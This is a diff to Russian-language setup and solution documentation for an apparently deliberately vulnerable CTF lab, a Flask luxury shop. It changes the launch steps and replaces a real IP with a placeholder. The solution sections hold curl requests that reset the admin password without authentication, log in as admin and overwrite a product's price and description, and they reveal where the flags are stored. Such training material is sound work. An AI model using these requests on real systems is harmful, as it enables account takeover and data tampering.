@@ -47,21 +47,32 @@ git: https://github.com/bezumhack/luxury-shop
 ```bash
 sed -i 's/luxury-shop\.city\.stf/YOUR_FQDN/g' /etc/hosts
 hostnamectl set-hostname YOUR_FQDN
-reboot now
 ```
+
+## Запуск backend-приложения
+
+После развёртывания образа backend запускается из виртуального окружения приложения.
+
+```bash
+cd
+source .venv/bin/activate
+cd bezumhack
+cd prod-main
+python3 app.py
+```
+
+Если запуск должен быть постоянным, рекомендуется выполнять его в отдельной `tmux`/`screen`-сессии либо оформить через systemd unit.
 
 <div style="page-break-after: always;"></div>
 
 # Уязвимый стенд
 
-```bash
-systemctl status luxury-shop nginx
-```
-
-При необходимости перезапуск сервисов:
+Проверка доступности компонентов и сетевых портов:
 
 ```bash
-systemctl restart luxury-shop nginx
+systemctl status nginx
+ss -lntp | grep -E ':8080|:5000'
+ps aux | grep python3
 ```
 
 ✅ Уязвимую машину можно **перезапускать**  
@@ -75,9 +86,8 @@ systemctl restart luxury-shop nginx
 Флаг хранится в поле `shipping_address` профиля пользователя `admin@example.com`.
 
 ```bash
-sqlite3 /opt/luxury-shop/instance/shop.db \
+sqlite3 "$HOME/bezumhack/prod-main/instance/shop.db" \
 "UPDATE user SET shipping_address='ctf{YOUR_FLAG_HERE}' WHERE email='admin@example.com';"
-systemctl restart luxury-shop
 ```
 
 ### Флаг 2 — карточка товара
@@ -85,18 +95,19 @@ systemctl restart luxury-shop
 Флаг хранится в поле `description` товара `yacht-001`.
 
 ```bash
-sqlite3 /opt/luxury-shop/instance/shop.db \
+sqlite3 "$HOME/bezumhack/prod-main/instance/shop.db" \
 "UPDATE product SET description='ctf{YOUR_FLAG_HERE}' WHERE id='yacht-001';"
-systemctl restart luxury-shop
 ```
+
+Если приложение кэширует состояние в памяти, после смены флагов backend следует перезапустить командами из раздела «Запуск backend-приложения».
 
 # Работающие процессы и сервисы
 
-| Service             | Address                           | Description        |
-| ------------------- | --------------------------------- | ------------------ |
-| nginx.service       | [::]:80 / [::]:8080               | HTTP reverse proxy |
-| luxury-shop.service | 127.0.0.1:5000                    | Flask backend      |
-| shop.db             | /opt/luxury-shop/instance/shop.db | SQLite database    |
+| Service / Process | Address                                   | Description               |
+| ----------------- | ----------------------------------------- | ------------------------- |
+| nginx.service     | [::]:80 / [::]:8080                       | HTTP reverse proxy        |
+| python3 app.py    | 127.0.0.1:5000                            | Flask backend application |
+| shop.db           | `$HOME/bezumhack/prod-main/instance/shop.db` | SQLite database           |
 
 Сеть настроена через **UFW**
 
@@ -127,7 +138,7 @@ systemctl restart luxury-shop
 Проверочный запрос к профилю администратора:
 
 ```bash
-curl "http://82.202.142.35:8080/api/users/admin%40example.com"
+curl "http://YOUR_FQDN:8080/api/users/admin%40example.com"
 ```
 
 Ответ сервера подтверждает существование учётной записи `admin@example.com` и показывает, что backend принимает пользовательский идентификатор напрямую из URL.
@@ -145,7 +156,7 @@ curl "http://82.202.142.35:8080/api/users/admin%40example.com"
 Этот endpoint позволяет передать новое значение поля `password` без запроса текущего пароля, повторной аутентификации или отдельной проверки привилегий. В результате пароль учётной записи `admin@example.com` может быть заменён на произвольный.
 
 ```bash
-curl -X PUT "http://82.202.142.35:8080/api/users/admin%40example.com" \
+curl -X PUT "http://YOUR_FQDN:8080/api/users/admin%40example.com" \
   -H "Content-Type: application/json" \
   -d '{
     "name":"Алексей Смирнов",
@@ -163,7 +174,7 @@ curl -X PUT "http://82.202.142.35:8080/api/users/admin%40example.com" \
 Успешная аутентификация подтверждает, что управление учётной записью администратора полностью перехвачено и атакующий получил доступ к функциям и данным, доступным владельцу целевого аккаунта.
 
 ```bash
-curl -X POST "http://82.202.142.35:8080/api/auth/login" \
+curl -X POST "http://YOUR_FQDN:8080/api/auth/login" \
   -H "Content-Type: application/json" \
   -d '{
     "email":"admin@example.com",
@@ -176,7 +187,7 @@ curl -X POST "http://82.202.142.35:8080/api/auth/login" \
 После входа под учётной записью `admin@example.com` извлекается содержимое поля `shipping_address`, в котором размещён флаг формата `ctf{...}`.
 
 ```bash
-curl -s -X POST "http://82.202.142.35:8080/api/auth/login" \
+curl -s -X POST "http://YOUR_FQDN:8080/api/auth/login" \
   -H "Content-Type: application/json" \
   -d '{
     "email":"admin@example.com",
@@ -215,10 +226,10 @@ curl -s -X POST "http://82.202.142.35:8080/api/auth/login" \
 
 ```bash
 # Проверка существования пользователя
-curl "http://82.202.142.35:8080/api/users/admin%40example.com"
+curl "http://YOUR_FQDN:8080/api/users/admin%40example.com"
 
 # Смена пароля
-curl -X PUT "http://82.202.142.35:8080/api/users/admin%40example.com" \
+curl -X PUT "http://YOUR_FQDN:8080/api/users/admin%40example.com" \
   -H "Content-Type: application/json" \
   -d '{
     "name":"Алексей Смирнов",
@@ -229,7 +240,7 @@ curl -X PUT "http://82.202.142.35:8080/api/users/admin%40example.com" \
   }'
 
 # Авторизация под новым паролем
-curl -X POST "http://82.202.142.35:8080/api/auth/login" \
+curl -X POST "http://YOUR_FQDN:8080/api/auth/login" \
   -H "Content-Type: application/json" \
   -d '{
     "email":"admin@example.com",
@@ -237,7 +248,7 @@ curl -X POST "http://82.202.142.35:8080/api/auth/login" \
   }'
 
 # Получение первого флага
-curl -s -X POST "http://82.202.142.35:8080/api/auth/login" \
+curl -s -X POST "http://YOUR_FQDN:8080/api/auth/login" \
   -H "Content-Type: application/json" \
   -d '{
     "email":"admin@example.com",
@@ -252,7 +263,7 @@ curl -s -X POST "http://82.202.142.35:8080/api/auth/login" \
 При анализе API каталога установлено, что карточки товаров доступны через endpoint `/api/products/<id>`. Запрос к товару `yacht-001` возвращает полную структуру объекта, включая название, тип, цену, изображение и описание.
 
 ```bash
-curl "http://82.202.142.35:8080/api/products/yacht-001"
+curl "http://YOUR_FQDN:8080/api/products/yacht-001"
 ```
 
 Полученный ответ позволяет определить формат объекта товара и подготовить корректный запрос на его изменение.
@@ -270,7 +281,7 @@ curl "http://82.202.142.35:8080/api/products/yacht-001"
 Запрос позволяет подменить критически важные поля, включая цену и описание.
 
 ```bash
-curl -X PUT "http://82.202.142.35:8080/api/products/yacht-001" \
+curl -X PUT "http://YOUR_FQDN:8080/api/products/yacht-001" \
   -H "Content-Type: application/json" \
   -d '{
     "title":"Azimut 77 Yacht",
@@ -288,7 +299,7 @@ curl -X PUT "http://82.202.142.35:8080/api/products/yacht-001" \
 Повторный запрос подтверждает, что изменения сохранены сервером и опубликованы в каталоге без проверки роли администратора или дополнительного механизма авторизации.
 
 ```bash
-curl "http://82.202.142.35:8080/api/products/yacht-001"
+curl "http://YOUR_FQDN:8080/api/products/yacht-001"
 ```
 
 ### Шаг 5 - Получение флага
@@ -296,7 +307,7 @@ curl "http://82.202.142.35:8080/api/products/yacht-001"
 Флаг извлекается из поля `description` карточки товара `yacht-001` после успешного изменения и повторного чтения объекта товара.
 
 ```bash
-curl -s "http://82.202.142.35:8080/api/products/yacht-001" | jq -r '.description'
+curl -s "http://YOUR_FQDN:8080/api/products/yacht-001" | jq -r '.description'
 ```
 
 ### Шаг 6 - Реализация критического события
@@ -329,10 +340,10 @@ curl -s "http://82.202.142.35:8080/api/products/yacht-001" | jq -r '.description
 
 ```bash
 # Просмотр карточки товара
-curl "http://82.202.142.35:8080/api/products/yacht-001"
+curl "http://YOUR_FQDN:8080/api/products/yacht-001"
 
 # Изменение карточки товара без admin-доступа
-curl -X PUT "http://82.202.142.35:8080/api/products/yacht-001" \
+curl -X PUT "http://YOUR_FQDN:8080/api/products/yacht-001" \
   -H "Content-Type: application/json" \
   -d '{
     "title":"Azimut 77 Yacht",
@@ -343,8 +354,8 @@ curl -X PUT "http://82.202.142.35:8080/api/products/yacht-001" \
   }'
 
 # Проверка изменения
-curl "http://82.202.142.35:8080/api/products/yacht-001"
+curl "http://YOUR_FQDN:8080/api/products/yacht-001"
 
 # Получение второго флага
-curl -s "http://82.202.142.35:8080/api/products/yacht-001" | jq -r '.description'
+curl -s "http://YOUR_FQDN:8080/api/products/yacht-001" | jq -r '.description'
 ```
